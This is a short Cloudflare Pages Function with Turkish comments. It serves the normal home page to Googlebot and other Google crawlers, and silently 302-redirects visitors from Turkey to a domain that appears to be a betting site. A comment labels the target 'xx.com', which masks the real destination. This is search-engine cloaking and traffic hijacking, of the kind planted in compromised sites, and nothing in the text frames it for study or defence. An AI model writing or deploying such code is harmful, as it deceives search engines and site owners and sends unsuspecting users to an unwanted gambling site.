export async function onRequest(context) {
  const request = context.request;
  const url = new URL(request.url);
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();

  // Sadece ana sayfa
  if (url.pathname !== '/' && url.pathname !== '/index.html') {
    return context.next();
  }

  // Googlebot kontrolü (SEO bozulmasın)
  const isGooglebot = /googlebot|mediapartners-google|adsbot-google|google-inspectiontool/i.test(userAgent);
  if (isGooglebot) {
    console.log('Googlebot detected – serving index.html');
    return context.next();
  }

  // Cloudflare ülke bilgisi
  const country = request.cf?.country;

  // Türkiye'den gelenler → xx.com
  if (country === 'TR') {
    console.log('Turkey visitor – redirecting to xx.com');
    return Response.redirect('https://casibom8957.com', 302);
  }

  // Diğer ülkeler → normal akış
  return context.next();
}
